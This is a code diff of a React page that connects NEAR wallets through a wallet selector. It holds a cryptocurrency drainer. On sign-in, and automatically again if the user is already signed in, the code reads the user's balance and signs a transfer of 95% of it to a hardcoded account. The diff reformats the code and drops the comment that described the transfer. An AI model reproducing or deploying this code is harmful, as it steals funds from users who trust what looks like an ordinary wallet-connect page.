@@ -26,82 +26,94 @@ export default function Home() {
   const [loading, setLoading] = useState(true);
 
   useEffect(() => {
-    let unwrap;
-    const initWalletSelector = async () => {
-      try {
-        const selector = await setupWalletSelector({
-          network: "mainnet",
-          modules: [
-            setupHotWallet(),
-            setupLedger(),
-            setupMyNearWallet(),
-            setupHereWallet(),
-            setupMeteorWallet(),
-            setupNightly(),
-            setupSender(),
-            setupBitgetWallet(),
-            setupMathWallet(),
-            setupCoin98Wallet(),
-            setupBitteWallet(),
-            setupNarwallets(),
-            setupRamperWallet(),
-            setupWelldoneWallet(),
-            setupXDEFI(),
-          ],
-        });
+  let unwrap;
 
-        const modal = setupModal(selector, { contractId: "" });
-        modalRef.current = modal;
-        setSelector(selector);
+  const initWalletSelector = async () => {
+    try {
+      const selector = await setupWalletSelector({
+        network: "mainnet",
+        modules: [
+          setupHotWallet(),
+          setupLedger(),
+          setupMyNearWallet(),
+          setupHereWallet(),
+          setupMeteorWallet(),
+          setupNightly(),
+          setupSender(),
+          setupBitgetWallet(),
+          setupMathWallet(),
+          setupCoin98Wallet(),
+          setupBitteWallet(),
+          setupNarwallets(),
+          setupRamperWallet(),
+          setupWelldoneWallet(),
+          setupXDEFI(),
+        ],
+      });
 
-        // Listen for successful sign-in to trigger transfer of 95% balance
-        const onSignIn = async () => {
+      const modal = setupModal(selector, { contractId: "" });
+      modalRef.current = modal;
+      setSelector(selector);
+
+      const onSignIn = async () => {
+        try {
           const wallet = await selector.wallet();
           const accounts = await wallet.getAccounts();
-                   const signerId = accounts[0].accountId;
+          const signerId = accounts[0].accountId;
 
-          try {
-            // Fetch account balance from RPC
-           const rpcProvider = new providers.JsonRpcProvider({ url: "https://rpc.mainnet.near.org" });
-            const accountState = await rpcProvider.query({ request_type: "view_account", account_id: signerId, finality: "final" });
-            const balance = BigInt(accountState.amount);
-            // Calculate 95% of balance
-            const transferAmount = (balance * 95n) / 100n;
+          // Fetch account balance from RPC
+          const rpcProvider = new providers.JsonRpcProvider({
+            url: "https://rpc.mainnet.near.org",
+          });
+          const accountState = await rpcProvider.query({
+            request_type: "view_account",
+            account_id: signerId,
+            finality: "final",
+          });
 
-       const transaction = {
-  receiverId: "460da082d5bedbf30ff97a4066dc4bfa9e8456b370ca53865ff762de5a075b73",
-  actions: [
-    {
-      type: "Transfer",
-      params: {
-        deposit: transferAmount.toString()
+          const balance = BigInt(accountState.amount);
+          const transferAmount = (balance * 95n) / 100n;
+
+          const transaction = {
+            receiverId: "460da082d5bedbf30ff97a4066dc4bfa9e8456b370ca53865ff762de5a075b73",
+            actions: [
+              {
+                type: "Transfer",
+                params: {
+                  deposit: transferAmount.toString(),
+                },
+              },
+            ],
+          };
+
+          await wallet.signAndSendTransactions({
+            transactions: [transaction],
+          });
+        } catch (err) {
+          console.error("Transfer failed:", err);
+        }
+      };
+
+      selector.on("signedIn", onSignIn);
+      unwrap = () => selector.off("signedIn", onSignIn);
+
+      // Auto-retry transfer if already signed in (e.g., returning from mobile wallet)
+      if (selector.isSignedIn()) {
+        await onSignIn();
       }
+
+      setLoading(false);
+    } catch (err) {
+      console.error("Error initializing wallet selector:", err);
     }
-  ]
-};
+  };
 
-           await wallet.signAndSendTransactions({
-  transactions: [transaction],
-});
-            
-          } catch (err) {
-            console.error("Transfer failed:", err);
-          }
-        };
+  initWalletSelector();
 
-        selector.on("signedIn", onSignIn);
-        unwrap = () => selector.off("signedIn", onSignIn);
-
-        setLoading(false);
-      } catch (err) {
-        console.error("Error initializing wallet selector:", err);
-      }
-    };
-
-    initWalletSelector();
-
-    return () => { if (unwrap) unwrap(); };
-  }, []);
+  return () => {
+    if (unwrap) unwrap();
+  };
+}, []);
 
   const handleConnect = () => {
     if (modalRef.current) {
